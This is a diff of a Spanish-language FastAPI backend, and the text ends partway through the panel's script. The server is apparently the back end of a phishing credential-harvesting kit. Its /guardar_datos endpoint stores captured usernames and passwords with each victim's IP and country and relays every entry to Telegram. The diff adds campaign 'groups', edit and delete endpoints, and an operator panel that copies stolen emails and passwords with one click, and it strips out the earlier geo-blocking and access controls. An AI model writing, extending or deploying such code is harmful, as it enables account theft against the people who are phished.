@@ -27,6 +27,7 @@ from contextlib import asynccontextmanager
 import logging
 from asyncio import Semaphore, Queue
 import weakref
+from bson import ObjectId
 
 # ============================================================
 # 🔧 FIX #1: DNS MONKEYPATCH AGRESIVO PARA PYMONGO/MOTOR (A prueba de fallos)
@@ -110,17 +111,12 @@ MONGO_URI_SRV = os.getenv(
 )
 MONGO_URI_DIRECT = os.getenv("MONGO_URI_DIRECT", "")
 
-numeros_r = frozenset({4, 6, 9})
-iprandom = frozenset({4, 6, 9})
-
 # ============================================================
 # CACHES Y CONFIGURACIONES GLOBALES
 # ============================================================
 CACHE_TTL = 300
 ip_cache: Dict[str, tuple] = {}
 blocked_ips_cache: Set[str] = set()
-user_cache: Dict[str, int] = {}
-ip_number_cache: Dict[str, int] = {}
 
 MAX_CONCURRENT_REQUESTS = 100
 MAX_DB_CONNECTIONS = 20
@@ -133,7 +129,6 @@ TELEGRAM_TIMEOUT = 10.0
 TELEGRAM_RETRY_DELAY = 0.5
 MAX_TELEGRAM_RETRIES = 2
 RATE_LIMIT_MESSAGES_PER_MINUTE = 30
-RATE_LIMIT_MESSAGES_PER_SECOND = 1
 
 request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
 db_semaphore = Semaphore(MAX_DB_CONNECTIONS)
@@ -404,7 +399,7 @@ app.add_middleware(
 )
 
 # ============================================================
-# MONGO CLIENT (Con timeouts ampliados y resiliencia)
+# MONGO CLIENT
 # ============================================================
 def _crear_cliente_mongo():
     opciones = dict(
@@ -432,17 +427,11 @@ def _crear_cliente_mongo():
 
 client = _crear_cliente_mongo()
 db = client["api_db"]
-ip_numbers = db["ip_numbers"]
-user_numbers = db["user_numbers"]
-global_settings = db["global_settings"]
 logs_usuarios = db["logs_usuarios"]
 ip_bloqueadas = db["ip_bloqueadas"]
+credenciales_usuario = db["credenciales_usuario"]
 
-cola = deque(maxlen=100)
-baneado = deque(maxlen=200)
-variable = False
-is_active_cache = False
-cache_last_updated = 0
+blocked_ips_cache: Set[str] = set()
 
 # ============================================================
 # HELPERS
@@ -457,120 +446,48 @@ async def init_db_async():
     async with db_semaphore:
         try:
             tasks = [
-                asyncio.wait_for(ip_numbers.create_index("ip", unique=True, background=True), timeout=10.0),
-                asyncio.wait_for(user_numbers.create_index("username", unique=True, background=True), timeout=10.0),
-                asyncio.wait_for(global_settings.create_index("id", unique=True, background=True), timeout=10.0),
-                asyncio.wait_for(ip_bloqueadas.create_index("ip", background=True), timeout=10.0)
+                asyncio.wait_for(ip_bloqueadas.create_index("ip", unique=True, background=True), timeout=10.0),
+                asyncio.wait_for(logs_usuarios.create_index("grupo", background=True), timeout=10.0),
+                asyncio.wait_for(credenciales_usuario.create_index("usuario", unique=True, background=True), timeout=10.0)
             ]
             await asyncio.gather(*tasks, return_exceptions=True)
-
-            if not await global_settings.find_one({"id": 1}):
-                await global_settings.insert_one({"id": 1, "is_active": False})
-
             logger.info("Base de datos inicializada correctamente")
         except Exception as e:
             logger.error(f"Error inicializando BD: {e}")
             raise
 
 async def load_caches():
-    global blocked_ips_cache, is_active_cache, cache_last_updated
+    global blocked_ips_cache
     async with db_semaphore:
         try:
             blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
             blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
-
-            settings = await global_settings.find_one({"id": 1})
-            is_active_cache = settings.get("is_active", False) if settings else False
-
-            ip_docs = ip_numbers.find({}, {"ip": 1, "number": 1}).limit(2000)
-            async for doc in ip_docs:
-                ip_number_cache[doc["ip"]] = doc["number"]
-
-            user_docs = user_numbers.find({}, {"username": 1, "number": 1}).limit(2000)
-            async for doc in user_docs:
-                user_cache[doc["username"]] = doc["number"]
-
-            cache_last_updated = time.time()
-            logger.info(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas, {len(ip_number_cache)} IPs, {len(user_cache)} usuarios")
+            logger.info(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas")
         except Exception as e:
             logger.error(f"Error cargando caches: {e}")
             raise
 
-@lru_cache(maxsize=2000)
-def validar_contrasena_cached(contrasena: str) -> bool:
-    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
-    return bool(re.match(patron, contrasena))
-
 async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
-    current_time = time.time()
-    if ip in ip_cache:
-        cached_result, cached_time = ip_cache[ip]
-        if current_time - cached_time < CACHE_TTL:
-            return cached_result
-
     async with http_semaphore:
         url = f"http://ipwhois.app/json/{ip}"
         try:
-            response = await asyncio.wait_for(
-                app.state.http_client.get(url), timeout=5.0
-            )
+            response = await asyncio.wait_for(app.state.http_client.get(url), timeout=5.0)
             if response.status_code == 200:
                 data = response.json()
                 country = data.get('country_code', 'Unknown')
-                result = (country in PAISES_LATINOAMERICA, country)
-
-                if len(ip_cache) > 5000:
-                    old_keys = [k for k, (_, t) in ip_cache.items() if current_time - t > CACHE_TTL * 2]
-                    for k in old_keys[:1000]:
-                        ip_cache.pop(k, None)
-
-                ip_cache[ip] = (result, current_time)
-                return result
+                return (country in PAISES_LATINOAMERICA, country)
             return (False, 'Unknown')
-        except asyncio.TimeoutError:
-            logger.warning(f"Timeout verificando país para IP {ip}")
+        except Exception:
             return (False, 'Unknown')
-        except Exception as e:
-            logger.error(f"Error verificando país: {e}")
-            return (False, 'Unknown')
-
-def agregar_elemento_diccionario_cache(ip: str, numero: int):
-    if len(ip_number_cache) > 10000:
-        keys_to_remove = list(ip_number_cache.keys())[:1000]
-        for key in keys_to_remove:
-            ip_number_cache.pop(key, None)
-    ip_number_cache[ip] = numero
-
-async def agregar_elemento_diccionario_async(ip: str, numero: int):
-    async with db_semaphore:
-        try:
-            await asyncio.wait_for(
-                ip_numbers.insert_one({"ip": ip, "number": numero}),
-                timeout=5.0
-            )
-            agregar_elemento_diccionario_cache(ip, numero)
-        except asyncio.TimeoutError:
-            logger.warning(f"Timeout guardando IP {ip} en BD")
-        except Exception as e:
-            logger.error(f"Error guardando IP en BD: {e}")
 
 def obtener_ip_real(request: Request) -> str:
-    headers_to_check = ["x-forwarded-for", "x-real-ip", "cf-connecting-ip", "x-client-ip"]
-    for header in headers_to_check:
+    for header in ["x-forwarded-for", "x-real-ip", "cf-connecting-ip", "x-client-ip"]:
         value = request.headers.get(header)
         if value:
             ip = value.split(",")[0].strip()
             if ip:
                 return ip
     return request.client.host if request.client else "127.0.0.1"
-
-def es_ip_local_o_privada(ip: str) -> bool:
-    try:
-        ip_obj = ipaddress.ip_address(ip)
-        return (ip_obj.is_loopback or ip_obj.is_private or
-                ip_obj.is_link_local or ip_obj.is_reserved)
-    except ValueError:
-        return False
 
 # ============================================================
 # MIDDLEWARES
@@ -582,254 +499,493 @@ class ConcurrencyLimitMiddleware(BaseHTTPMiddleware):
                 async with request_semaphore:
                     return await call_next(request)
         except asyncio.TimeoutError:
-            logger.warning(f"Request timeout para {request.url.path}")
-            return JSONResponse(status_code=503, content={"detail": "Servidor ocupado, intenta más tarde"})
-        except Exception as e:
-            logger.error(f"Error en ConcurrencyLimitMiddleware: {e}")
-            return JSONResponse(status_code=500, content={"detail": "Error interno del servidor"})
-
-class FastBasicAuthMiddleware(BaseHTTPMiddleware):
-    def __init__(self, app, username: str, password: str):
-        super().__init__(app)
-        self.auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()
-
-    async def dispatch(self, request: Request, call_next: Callable):
-        if request.url.path.startswith(("/docs", "/redoc")):
-            auth = request.headers.get("Authorization")
-            if not auth or not auth.endswith(self.auth_string):
-                return Response("Unauthorized", status_code=401,
-                                headers={"WWW-Authenticate": "Basic"})
-        return await call_next(request)
-
-class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
-    async def dispatch(self, request: Request, call_next: Callable):
-        client_ip = obtener_ip_real(request)
-
-        if client_ip in blocked_ips_cache:
-            return JSONResponse(
-                status_code=403,
-                content={"detail": "Acceso denegado, la IP está bloqueada " + client_ip}
-            )
-
-        if es_ip_local_o_privada(client_ip):
-            if client_ip not in ip_number_cache:
-                numero_random = random.randint(0, 9)
-                agregar_elemento_diccionario_cache(client_ip, numero_random)
-                await add_background_task(agregar_elemento_diccionario_async, client_ip, numero_random)
-            return await call_next(request)
-
-        excluded_paths = {"/docs", "/redoc", "/openapi.json", "/health", "/metrics",
-                          "/login", "/guardar_datos", "/ver_datos"}
-        if request.url.path not in excluded_paths:
-            try:
-                permitido, pais = await asyncio.wait_for(
-                    verificar_pais_cached(client_ip), timeout=8.0
-                )
-                if not permitido:
-                    logger.info(f"IP bloqueada por geolocalización: {client_ip} ({pais})")
-                    return JSONResponse(
-                        status_code=403,
-                        content={"detail": "Acceso denegado", "ip": client_ip, "country": pais}
-                    )
-            except asyncio.TimeoutError:
-                logger.warning(f"Timeout geolocalización IP {client_ip}")
-            except Exception as e:
-                logger.error(f"Error geolocalización: {e}")
-
-        if client_ip not in ip_number_cache:
-            numero_random = random.randint(0, 9)
-            agregar_elemento_diccionario_cache(client_ip, numero_random)
-            await add_background_task(agregar_elemento_diccionario_async, client_ip, numero_random)
-
-        return await call_next(request)
+            return JSONResponse(status_code=503, content={"detail": "Servidor ocupado"})
+        except Exception:
+            return JSONResponse(status_code=500, content={"detail": "Error interno"})
 
 app.add_middleware(ConcurrencyLimitMiddleware)
-app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)
-app.add_middleware(OptimizedIPBlockMiddleware)
 
 # ============================================================
 # MODELOS
 # ============================================================
-class ClaveRequest(BaseModel):
-    clave: str
-
-class UpdateNumberRequest(BaseModel):
-    numero: int
-
-class IPRequest(BaseModel):
-    ip: str
-
-class DynamicMessage(BaseModel):
-    mensaje: str
+class UpdateLogRequest(BaseModel):
+    usuario: Optional[str] = None
+    contra: Optional[str] = None
+    grupo: Optional[str] = None
 
 # ============================================================
 # ENDPOINTS
 # ============================================================
-@app.get("/login", response_class=HTMLResponse)
-async def login_form():
-    return """
-    <html><head><title>Acceso</title></head>
-    <body style="font-family:sans-serif; text-align:center; padding-top:100px;">
-        <h2>Ingrese la contraseña para acceder</h2>
-        <form method="post" action="/login">
-            <input type="password" name="password" placeholder="Contraseña" />
-            <button type="submit">Ingresar</button>
-        </form>
-    </body></html>
-    """
-
-@app.post("/login")
-async def login(password: str = Form(...)):
-    if password == "gato123":
-        try:
-            with open("static/panel.html", "r", encoding="utf-8") as f:
-                content = f.read()
-            return HTMLResponse(content=content)
-        except Exception:
-            return HTMLResponse("<h3>Panel no encontrado</h3>", status_code=404)
-    else:
-        return HTMLResponse(
-            "<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>",
-            status_code=401
-        )
-
-@app.post("/validar_clave")
-async def validar_clave(data: ClaveRequest):
-    return {"valido": data.clave == "gato123"}
-
-async def _bloquear_ip_bd(ip: str):
-    async with db_semaphore:
-        try:
-            await asyncio.wait_for(
-                ip_bloqueadas.insert_one({"ip": ip, "fecha_bloqueo": datetime.utcnow()}),
-                timeout=5.0
-            )
-        except Exception as e:
-            logger.error(f"Error bloqueando IP en BD: {e}")
-
-@app.post("/bloquear_ip/")
-async def bloquear_ip(data: IPRequest):
-    ip = data.ip.strip()
-    if ip not in blocked_ips_cache:
-        blocked_ips_cache.add(ip)
-        await add_background_task(_bloquear_ip_bd, ip)
-        return {"message": f"La IP {ip} ha sido bloqueada."}
-    return {"message": f"La IP {ip} ya estaba bloqueada."}
-
-async def _desbloquear_ip_bd(ip: str):
-    async with db_semaphore:
-        try:
-            await asyncio.wait_for(ip_bloqueadas.delete_one({"ip": ip}), timeout=5.0)
-        except Exception as e:
-            logger.error(f"Error desbloqueando IP en BD: {e}")
-
-@app.post("/desbloquear_ip/")
-async def desbloquear_ip(data: IPRequest):
-    ip = data.ip.strip()
-    if ip in blocked_ips_cache:
-        blocked_ips_cache.discard(ip)
-        await add_background_task(_desbloquear_ip_bd, ip)
-        return {"message": f"La IP {ip} ha sido desbloqueada."}
-    return {"message": f"La IP {ip} no estaba bloqueada."}
-
-@app.get("/ips_bloqueadas/")
-async def obtener_ips_bloqueadas():
-    return {"ips_bloqueadas": [{"ip": ip, "fecha_bloqueo": "cached"} for ip in blocked_ips_cache]}
-
 @app.get("/")
 async def read_root():
-    return {"message": "API funcionando correctamente!"}
+    return {"message": "API con copia rápida al portapapeles activa!"}
 
-async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
+async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str, grupo: str):
     async with db_semaphore:
         try:
-            await asyncio.wait_for(
-                logs_usuarios.insert_one({
-                    "usuario": usuario, "contrasena": contra,
-                    "ip": ip, "pais": pais, "fecha": datetime.utcnow()
-                }),
-                timeout=5.0
-            )
+            await logs_usuarios.insert_one({
+                "usuario": usuario,
+                "contrasena": contra,
+                "ip": ip,
+                "pais": pais,
+                "grupo": grupo.strip().lower(),
+                "fecha": datetime.utcnow()
+            })
         except Exception as e:
-            logger.error(f"Error guardando log usuario: {e}")
+            logger.error(f"Error guardando log: {e}")
 
 @app.post("/guardar_datos")
 async def guardar_datos(
     request: Request,
     usuario: str = Form(...),
-    contra: str = Form(...)
+    contra: str = Form(...),
+    grupo: str = Form("general")
 ):
-    # Detección limpia de IP y País directamente desde la solicitud en el servidor
     ip = obtener_ip_real(request)
     _, pais = await verificar_pais_cached(ip)
+    grupo_limpio = grupo.strip().lower()
     
-    # Guardar en base de datos vía background task
-    await add_background_task(_guardar_log_usuario, usuario, contra, ip, pais)
+    await add_background_task(_guardar_log_usuario, usuario, contra, ip, pais, grupo_limpio)
     
-    # Notificación por Telegram integrada
-    msg = f"🔔 *Nuevo registro detectado por servidor*\n👤 Usuario: `{usuario}`\n🔑 Contraseña: `{contra}`\n🌐 IP: `{ip}`\n🌍 País: `{pais}`"
+    msg = f"🔔 *Nuevo registro [Grupo: {grupo_limpio}]*\n👤 Usuario: `{usuario}`\n🔑 Contraseña: `{contra}`\n🌐 IP: `{ip}`\n🌍 País: `{pais}`"
     await enviar_telegram_hibrido(msg)
     
-    return {"message": "Datos guardados correctamente", "ip": ip, "pais": pais}
+    return {"message": "Datos guardados correctamente", "grupo": grupo_limpio, "ip": ip, "pais": pais}
 
-@app.get("/ver_datos", response_class=HTMLResponse)
-async def ver_datos():
+# ============================================================
+# ENDPOINTS PARA GESTIÓN DE ACCESO ÚNICO POR USUARIO
+# ============================================================
+@app.post("/api/usuario/configurar")
+async def configurar_password_usuario(usuario: str = Form(...), password: str = Form(...)):
+    async with db_semaphore:
+        usuario_limpio = usuario.strip().lower()
+        existente = await credenciales_usuario.find_one({"usuario": usuario_limpio})
+        if existente:
+            raise HTTPException(status_code=400, detail="Este usuario ya tiene una contraseña asignada y no se puede modificar por este medio.")
+        
+        await credenciales_usuario.insert_one({
+            "usuario": usuario_limpio,
+            "password": password,
+            "fecha_creacion": datetime.utcnow()
+        })
+        return {"message": f"Contraseña configurada exitosamente para el usuario '{usuario_limpio}'."}
+
+@app.post("/api/usuario/verificar")
+async def verificar_acceso_usuario(usuario: str = Form(...), password: str = Form(...)):
+    async with db_semaphore:
+        usuario_limpio = usuario.strip().lower()
+        doc = await credenciales_usuario.find_one({"usuario": usuario_limpio})
+        if not doc or doc["password"] != password:
+            raise HTTPException(status_code=401, detail="Contraseña incorrecta o usuario no registrado.")
+        return {"status": "ok", "usuario": usuario_limpio}
+
+# ============================================================
+# ENDPOINTS CRUD
+# ============================================================
+@app.get("/api/logs")
+async def api_obtener_logs(usuario: str, password: str, grupo: Optional[str] = None):
+    async with db_semaphore:
+        doc = await credenciales_usuario.find_one({"usuario": usuario.strip().lower()})
+        if not doc or doc["password"] != password:
+            raise HTTPException(status_code=401, detail="No autorizado.")
+
+        query = {"grupo": grupo.strip().lower()} if grupo and grupo != "todos" else {}
+        cursor = logs_usuarios.find(query).sort("fecha", -1).limit(200)
+        logs = await cursor.to_list(length=200)
+        
+        resultado = []
+        for log in logs:
+            resultado.append({
+                "id": str(log["_id"]),
+                "usuario": log.get("usuario", ""),
+                "contra": log.get("contrasena", ""),
+                "ip": log.get("ip", ""),
+                "pais": log.get("pais", ""),
+                "grupo": log.get("grupo", "general"),
+                "fecha": log.get("fecha").strftime("%Y-%m-%d %H:%M:%S") if isinstance(log.get("fecha"), datetime) else str(log.get("fecha"))
+            })
+        return {"logs": resultado}
+
+@app.get("/api/grupos")
+async def api_obtener_grupos():
+    async with db_semaphore:
+        grupos = await logs_usuarios.distinct("grupo")
+        return {"grupos": grupos if grupos else ["general"]}
+
+@app.put("/api/logs/{log_id}")
+async def api_editar_log(log_id: str, data: UpdateLogRequest):
     async with db_semaphore:
         try:
-            cursor = logs_usuarios.find().sort("fecha", -1).limit(100)
-            logs = await cursor.to_list(length=100)
-            
-            rows = ""
-            for log in logs:
-                fecha_val = log.get("fecha")
-                fecha_str = fecha_val.strftime("%Y-%m-%d %H:%M:%S") if isinstance(fecha_val, datetime) else str(fecha_val)
-                rows += f"""
-                <tr>
-                    <td>{log.get("usuario", "")}</td>
-                    <td>{log.get("contrasena", "")}</td>
-                    <td>{log.get("ip", "")}</td>
-                    <td>{log.get("pais", "")}</td>
-                    <td>{fecha_str}</td>
-                </tr>
-                """
-            
-            html_content = f"""
-            <html>
-                <head>
-                    <title>Logs de Usuarios</title>
-                    <style>
-                        body {{ font-family: sans-serif; margin: 20px; background-color: #f9f9f9; }}
-                        h2 {{ color: #333; }}
-                        table {{ width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
-                        th, td {{ padding: 10px 15px; border: 1px solid #ddd; text-align: left; }}
-                        th {{ background-color: #007bff; color: white; }}
-                        tr:nth-child(even) {{ background-color: #f2f2f2; }}
-                    </style>
-                </head>
-                <body>
-                    <h2>Registros de Usuarios Guardados</h2>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>Usuario</th>
-                                <th>Contraseña</th>
-                                <th>IP</th>
-                                <th>País</th>
-                                <th>Fecha (UTC)</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            {rows if rows else '<tr><td colspan="5" style="text-align:center;">No hay registros disponibles.</td></tr>'}
-                        </tbody>
-                    </table>
-                </body>
-            </html>
-            """
-            return HTMLResponse(content=html_content)
-            
-        except asyncio.TimeoutError:
-            logger.warning("Timeout al consultar logs de usuarios en la base de datos.")
-            return HTMLResponse("<h3>Error: Tiempo de espera agotado al consultar la base de datos.</h3>", status_code=504)
+            update_data = {}
+            if data.usuario is not None: update_data["usuario"] = data.usuario
+            if data.contra is not None: update_data["contrasena"] = data.contra
+            if data.grupo is not None: update_data["grupo"] = data.grupo.strip().lower()
+
+            if not update_data:
+                raise HTTPException(status_code=400, detail="Sin datos a actualizar")
+
+            result = await logs_usuarios.update_one({"_id": ObjectId(log_id)}, {"$set": update_data})
+            if result.matched_count == 0:
+                raise HTTPException(status_code=404, detail="No encontrado")
+            return {"message": "Actualizado exitosamente"}
         except Exception as e:
-            logger.error(f"Error en /ver_datos: {e}")
-            return HTMLResponse(f"<h3>Error interno al cargar los datos: {e}</h3>", status_code=500)
+            if isinstance(e, HTTPException): raise e
+            raise HTTPException(status_code=400, detail="Error en ID o BD")
+
+@app.delete("/api/logs/{log_id}")
+async def api_eliminar_log(log_id: str):
+    async with db_semaphore:
+        try:
+            result = await logs_usuarios.delete_one({"_id": ObjectId(log_id)})
+            if result.deleted_count == 0:
+                raise HTTPException(status_code=404, detail="No encontrado")
+            return {"message": "Eliminado exitosamente"}
+        except Exception as e:
+            if isinstance(e, HTTPException): raise e
+            raise HTTPException(status_code=400, detail="Error en ID o BD")
+
+@app.delete("/api/grupo/{grupo_nombre}")
+async def api_eliminar_grupo(grupo_nombre: str):
+    async with db_semaphore:
+        result = await logs_usuarios.delete_many({"grupo": grupo_nombre.strip().lower()})
+        return {"message": f"Se eliminaron {result.deleted_count} registros"}
+
+# ============================================================
+# PANEL HTML CON COPIA RÁPIDA AL HACER CLIC
+# ============================================================
+@app.get("/ver_datos", response_class=HTMLResponse)
+async def ver_datos():
+    html_content = """
+    <!DOCTYPE html>
+    <html lang="es">
+    <head>
+        <meta charset="UTF-8">
+        <title>Panel de Acceso por Usuario</title>
+        <style>
+            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #f4f6f9; color: #333; }
+            h2 { color: #2c3e50; }
+            .card { background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }
+            .card input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+            .controls { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+            select, button, input { padding: 8px 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
+            button { background-color: #007bff; color: white; border: none; cursor: pointer; }
+            button:hover { background-color: #0056b3; }
+            button.btn-danger { background-color: #dc3545; }
+            button.btn-warning { background-color: #ffc107; color: #212529; }
+            table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+            th, td { padding: 12px 15px; border-bottom: 1px solid #eee; text-align: left; }
+            th { background-color: #007bff; color: white; }
+            tr:hover { background-color: #f8f9fa; }
+            
+            /* Estilo interactivo para copiar al dar clic */
+            .copyable {
+                cursor: pointer;
+                position: relative;
+                transition: color 0.2s;
+            }
+            .copyable:hover {
+                color: #007bff;
+                text-decoration: underline;
+            }
+            
+            /* Notificación flotante (Toast) */
+            #toast {
+                visibility: hidden;
+                min-width: 200px;
+                background-color: #333;
+                color: #fff;
+                text-align: center;
+                border-radius: 4px;
+                padding: 10px;
+                position: fixed;
+                z-index: 1000;
+                right: 20px;
+                bottom: 20px;
+                font-size: 14px;
+                box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            }
+            #toast.show {
+                visibility: visible;
+                animation: fadein 0.3s, fadeout 0.3s 1.5s;
+            }
+            @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 20px; opacity: 1;} }
+            @keyframes fadeout { from {bottom: 20px; opacity: 1;} to {bottom: 0; opacity: 0;} }
+
+            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
+            .modal-content { background: white; padding: 25px; border-radius: 8px; width: 400px; }
+            .modal-content input { width: 100%; margin-bottom: 15px; box-sizing: border-box; }
+            .modal-buttons { display: flex; justify-content: flex-end; gap: 10px; }
+            #crudContainer { display: none; }
+        </style>
+    </head>
+    <body>
+
+        <!-- PANTALLA DE ACCESO -->
+        <div id="authContainer" class="card">
+            <h2>Acceso al Panel</h2>
+            <p id="authSubtitle" style="font-size: 13px; color: #666;">Ingresa tu usuario y contraseña. Si es tu primera vez con este usuario, se creará su contraseña permanente.</p>
+            <input type="text" id="loginUsuario" placeholder="Nombre de Usuario">
+            <input type="password" id="loginPassword" placeholder="Contraseña">
+            <button style="width: 100%;" onclick="autenticarUsuario()">Ingresar / Configurar</button>
+            <p id="authError" style="color: red; font-size: 13px; margin-top: 10px; text-align: center;"></p>
+        </div>
+
+        <!-- PANEL CRUD PRINCIPAL -->
+        <div id="crudContainer">
+            <h2>Panel de Administración - Usuario: <span id="spanUser"></span></h2>
+            
+            <div class="controls">
+                <div>
+                    <label for="grupoSelect"><strong>Filtrar Grupo:</strong></label>
+                    <select id="grupoSelect" onchange="cargarLogs()">
+                        <option value="todos">Todos los grupos</option>
+                    </select>
+                    <button onclick="cargarGruposYLogs()" style="margin-left: 10px;">Actualizar</button>
+                </div>
+                <div>
+                    <button class="btn-danger" onclick="eliminarGrupoActual()">Eliminar Grupo Actual</button>
+                    <button onclick="cerrarSesion()" style="background-color: #6c757d; margin-left: 10px;">Salir</button>
+                </div>
+            </div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Grupo</th>
+                        <th>Correo / Usuario</th>
+                        <th>Contraseña (Clave)</th>
+                        <th>IP</th>
+                        <th>País</th>
+                        <th>Fecha (UTC)</th>
+                        <th>Acciones</th>
+                    </tr>
+                </thead>
+                <tbody id="tablaLogs">
+                    <tr><td colspan="7" style="text-align:center;">Cargando registros...</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Notificación Toast flotante -->
+        <div id="toast">¡Copiado al portapapeles!</div>
+
+        <!-- Modal de Edición -->
+        <div id="editModal" class="modal">
+            <div class="modal-content">
+                <h3>Editar Registro</h3>
+                <input type="hidden" id="editId">
+                <label>Usuario:</label>
+                <input type="text" id="editUsuario">
+                <label>Contraseña:</label>
+                <input type="text" id="editContra">
+                <label>Grupo:</label>
+                <input type="text" id="editGrupo">
+                <div class="modal-buttons">
+                    <button class="btn-warning" onclick="cerrarModal()">Cancelar</button>
+                    <button onclick="guardarEdicion()">Guardar</button>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            let currentUser = "";
+            let currentPass = "";
+
+            window.onload = () => {
+                const savedUser = sessionStorage.getItem('crud_user');
+                const savedPass = sessionStorage.getItem('crud_pass');
+                if (savedUser && savedPass) {
+                    currentUser = savedUser;
+                    currentPass = savedPass;
+                    document.getElementById('spanUser').textContent = currentUser;
+                    document.getElementById('authContainer').style.display = 'none';
+                    document.getElementById('crudContainer').style.display = 'block';
+                    cargarGruposYLogs();
+                }
+            }
+
+            async function autenticarUsuario() {
+                const u = document.getElementById('loginUsuario').value.trim();
+                const p = document.getElementById('loginPassword').value.trim();
+                const errBox = document.getElementById('authError');
+                errBox.textContent = "";
+
+                if (!u || !p) {
+                    errBox.textContent = "Completa ambos campos.";
+                    return;
+                }
+
+                try {
+                    let formData = new URLSearchParams();
+                    formData.append('usuario', u);
+                    formData.append('password', p);
+
+                    let res = await fetch('/api/usuario/verificar', { method: 'POST', body: formData });
+                    
+                    if (res.ok) {
+                        guardarSesion(u, p);
+                        return;
+                    }
+
+                    if (res.status === 401) {
+                        let resConfig = await fetch('/api/usuario/configurar', { method: 'POST', body: formData });
+                        if (resConfig.ok) {
+                            alert("¡Contraseña configurada con éxito para este usuario! Ya no se podrá cambiar.");
+                            guardarSesion(u, p);
+                        } else {
+                            let errData = await resConfig.json();
+                            errBox.textContent = errData.detail || "Contraseña incorrecta para este usuario.";
+                        }
+                    } else {
+                        let errData = await res.json();
+                        errBox.textContent = errData.detail || "Error de autenticación.";
+                    }
+                } catch (e) {
+                    errBox.textContent = "Error de conexión con el servidor.";
+                }
+            }
+
+            function guardarSesion(u, p) {
+                currentUser = u;
+                currentPass = p;
+                sessionStorage.setItem('crud_user', u);
+                sessionStorage.setItem('crud_pass', p);
+                document.getElementById('spanUser').textContent = currentUser;
+                document.getElementById('authContainer').style.display = 'none';
+                document.getElementById('crudContainer').style.display = 'block';
+                cargarGruposYLogs();
+            }
+
+            function cerrarSesion() {
+                sessionStorage.clear();
+                window.location.reload();
+            }
+
+            // Función para copiar texto al portapapeles con notificación visual
+            function copiarTexto(texto) {
+                navigator.clipboard.writeText(texto).then(() => {
+                    const toast = document.getElementById("toast");
+                    toast.className = "show";
+                    setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 1800);
+                }).catch(err => {
+                    console.error("Error al copiar: ", err);
+                });
+            }
+
+            async function cargarGruposYLogs() {
+                try {
+                    const resGrupos = await fetch('/api/grupos');
+                    const dataGrupos = await resGrupos.json();
+                    const select = document.getElementById('grupoSelect');
+                    const valorActual = select.value;
+                    
+                    select.innerHTML = '<option value="todos">Todos los grupos</option>';
+                    dataGrupos.grupos.forEach(g => {
+                        const opt = document.createElement('option');
+                        opt.value = g;
+                        opt.textContent = g.toUpperCase();
+                        select.appendChild(opt);
+                    });
+                    select.value = dataGrupos.grupos.includes(valorActual) ? valorActual : 'todos';
+                } catch (e) {
+                    console.error("Error cargando grupos", e);
+                }
+                cargarLogs();
+            }
+
+            async function cargarLogs() {
+                const grupo = document.getElementById('grupoSelect').value;
+                let url = `/api/logs?usuario=${encodeURIComponent(currentUser)}&password=${encodeURIComponent(currentPass)}`;
+                if (grupo !== 'todos') url += `&grupo=${encodeURIComponent(grupo)}`;
+
+                try {
+                    const res = await fetch(url);
+                    if (!res.ok) {
+                        alert("Sesión inválida o credenciales incorrectas.");
+                        cerrarSesion();
+                        return;
+                    }
+                    const data = await res.json();
+                    const tbody = document.getElementById('tablaLogs');
+                    tbody.innerHTML = '';
+
+                    if (data.logs.length === 0) {
+                        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">No hay registros disponibles.</td></tr>';
+                        return;
+                    }
+
+                    data.logs.forEach(log => {
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `
+                            <td><strong>${log.grupo}</strong></td>
+                            <td><span class="copyable" title="Haz clic para copiar" onclick="copiarTexto('${log.usuario}')">${log.usuario} 📋</span></td>
+                            <td><span class="copyable" title="Haz clic para copiar" onclick="copiarTexto('${log.contra}')">${log.contra} 📋</span></td>
+                            <td>${log.ip}</td>
+                            <td>${log.pais}</td>
+                            <td>${log.fecha}</td>
+                            <td>
+                                <button class="btn-warning" onclick="abrirModal('${log.id}', '${log.usuario}', '${log.contra}', '${log.grupo}')">Editar</button>
+                                <button class="btn-danger" onclick="eliminarLog('${log.id}')">Eliminar</button>
+                            </td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                } catch (e) {
+                    console.error("Error cargando logs", e);
+                }
+            }
+
+            async function eliminarLog(id) {
+                if (!confirm("¿Eliminar este registro?")) return;
+                const res = await fetch(`/api/logs/${id}`, { method: 'DELETE' });
+                if (res.ok) cargarLogs();
+                else alert("Error al eliminar");
+            }
+
